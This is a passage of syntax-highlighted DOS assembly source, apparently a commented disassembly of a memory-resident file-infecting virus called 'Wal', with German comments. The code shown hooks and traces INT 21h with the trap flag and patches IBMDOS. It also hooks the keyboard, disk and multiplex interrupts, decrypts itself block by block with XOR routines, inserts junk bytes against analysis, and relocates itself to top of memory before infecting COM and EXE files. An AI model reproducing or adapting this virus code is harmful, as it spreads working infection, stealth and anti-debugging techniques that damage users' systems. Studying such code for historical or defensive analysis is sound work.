                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D256A</span><span class="sc4">],</span><span class="sc2">1EFFh</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D256C</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Low_INT_21H</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D256E</span><span class="sc4">],</span><span class="sc2">00C3h</span><span class="sc0">
</span><span class="sc5">J0287E</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                             </span><span class="sc1">; zeigt auf "RET"</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Vir_SP</span><span class="sc4">],</span><span class="sc2">2700h</span><span class="sc0">
</span><span class="sc5">EIN_RETURN</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">RETN</span><span class="sc0">                            </span><span class="sc1">; RETURN 2 Byte weiter</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------( Trash )---</span><span class="sc0">
</span><span class="sc5">J02887</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================( Teil-Initialisierung von SI)===</span><span class="sc0">
</span><span class="sc1">;====================================( IRET fÅhrt nach J02983     )===</span><span class="sc0">
</span><span class="sc1">;====================================( Wird als erstes ausgefÅhrt )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0288E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J02983</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Vir_NAME</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; BX = SI = 2983h</span><span class="sc0">
                </span><span class="sc6">IRET</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------( Trash )---</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">059h</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">023h</span><span class="sc4">,</span><span class="sc2">037h</span><span class="sc4">,</span><span class="sc2">05fh</span><span class="sc4">,</span><span class="sc2">0f3h</span><span class="sc4">,</span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc0">
</span><span class="sc1">;====================================================================</span><span class="sc0">
</span><span class="sc5">J028AB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">                </span><span class="sc1">; altes DS auf Stack</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CreateTempCode</span><span class="sc0">    </span><span class="sc1">; Return ist 1 word weiter !</span><span class="sc0">
                </span><span class="sc1">;--------------</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">58EAh</span><span class="sc0">
                </span><span class="sc1">;--------------</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==================================================( Code-Patcher )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;       BX zeigt auf J03047</span><span class="sc0">
</span><span class="sc1">;       aus     "CMP BX,SI"</span><span class="sc0">
</span><span class="sc1">;       wird</span><span class="sc0">
</span><span class="sc1">;       J03074: XOR     CS:[SI],BX</span><span class="sc0">
</span><span class="sc1">;               NOP</span><span class="sc0">
</span><span class="sc1">;               RET</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">J028B3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J03047</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0EF15h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">4568h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J0491A</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                        </span><span class="sc1">; Altes DS zurÅck</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PATCH</span><span class="sc0">                     </span><span class="sc1">; Gleich ausfÅhren !</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;======================================( WAL ist jetzt erst scharf)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">AFTER_PATCH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">MDECODE</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">StopINT_02</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24E3</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc0">                     </span><span class="sc1">; sic !</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">PSP_SEG</span><span class="sc4">],</span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Hole ersten MCB !</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2447</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
 
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt_AL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">   </span><span class="sc1">; Get INT 21h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Int_01_entry</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2450</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; keinen Åbergehen</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">                  </span><span class="sc1">; SET INT 01</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===================================================(TRACE INT 21h)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc1">;-----------------------------</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                </span><span class="sc1">; Tf ein</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">
                </span><span class="sc1">;-----------------------------</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc4">]</span><span class="sc1">; TRACE INT 21</span><span class="sc0">
                </span><span class="sc1">;-----------------------------</span><span class="sc0">
                </span><span class="sc6">PUSHF</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FEFFh</span><span class="sc0">                </span><span class="sc1">; TF aus</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POPF</span><span class="sc0">
                </span><span class="sc1">;-----------------------------</span><span class="sc0">
                </span><span class="sc6">LES</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Old int 21h</span><span class="sc0">
                </span><span class="sc1">;-----------------------------</span><span class="sc0">
                </span><span class="sc1">; Erzeugt JMP CS:2256/J04A66</span><span class="sc0">
                </span><span class="sc1">;-----------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Low_INT_21H</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D244B</span><span class="sc0">        </span><span class="sc4">],</span><span class="sc2">0EAh</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D244C</span><span class="sc0">        </span><span class="sc4">],</span><span class="sc2">2256h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">Low_INT_21H</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D244E</span><span class="sc0">        </span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc1">;-----------------------------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0298D</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_IBMDOS</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Wal_Ins_MEMTOP_Kopieren</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc1">; Wal entschwindet zur Speicherobergrenze, husch .....</span><span class="sc0">
</span><span class="sc1">;#####################################################################</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;#####################################################################</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================( PATCHT INT 09-Verarbeitung )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">INT_09_Patch</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
 
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                    </span><span class="sc1">; GET INT 09</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt_AL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">INT_09</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">INT_09</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2570</span><span class="sc4">],</span><span class="sc2">0EAh</span><span class="sc0">  </span><span class="sc1">; PATCHE "JMP CS:2273"</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2573</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">    </span><span class="sc1">; INS SCRATCHPAD</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2571</span><span class="sc4">],</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">J04A83</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                                                  </span><span class="sc1">; = JMP CS:4A83</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_INT_09</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J02975</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2587</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;------------------------------</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">027E9H</span><span class="sc0">
                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0EA1Ah</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;============================================( Get Virstart in SI )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02983</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J02983</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02F15</span><span class="sc0">                  </span><span class="sc1">; SI ist jetzt 2810h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">089h</span><span class="sc4">,</span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=========================================( Get INT 2F and INT 13 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0298D</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                  </span><span class="sc1">; GET INT 2F</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetInt_AL</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D2447</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J029BC</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Trace_int_13h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">Trace_Adres</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; DS:DX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt_AL</span><span class="sc0">               </span><span class="sc1">; SET INT 13</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">; DS = 0</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0475h</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0"> </span><span class="sc1">; Number of Hard-Drives</span><span class="sc0">

</span><span class="sc5">J029BC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==========================( Erste Routine, die im Oberen Speicher)===</span><span class="sc0">
</span><span class="sc1">;==========================( ausgefÅhrt wird.                     )===</span><span class="sc0">
</span><span class="sc1">;==========================( AB JETZT ist Offset 2810h = OFFSET 0 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J029C1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_IBMDOS</span><span class="sc0">    </span><span class="sc1">; Original wiederherstellen</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D244E</span><span class="sc4">],</span><span class="sc8">CS</span><span class="sc0">   </span><span class="sc1">; JMP CS:2256 korrigieren..</span><span class="sc0">
                                        </span><span class="sc1">; ist jetzt bei 4A66 ...</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Patch_IBMDOS</span><span class="sc0">    </span><span class="sc1">; und wieder Patchen</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">              </span><span class="sc1">; ES=DS=CS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INT_09_Patch</span><span class="sc0">    </span><span class="sc1">; Patche INT 09</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">InfectFlag</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Re_SET_Int_02</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">PSP_SEG</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">LDS</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc2">000Ah</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; INT 22h in DS:DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_Reloc_Ofs</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_FLAG</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">VIRSTART</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                                        </span><span class="sc1">; IST ES EIN EXE ??</span><span class="sc0">
                </span><span class="sc6">STI</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J02A2E</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================( restore Code-Start im alten CS )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
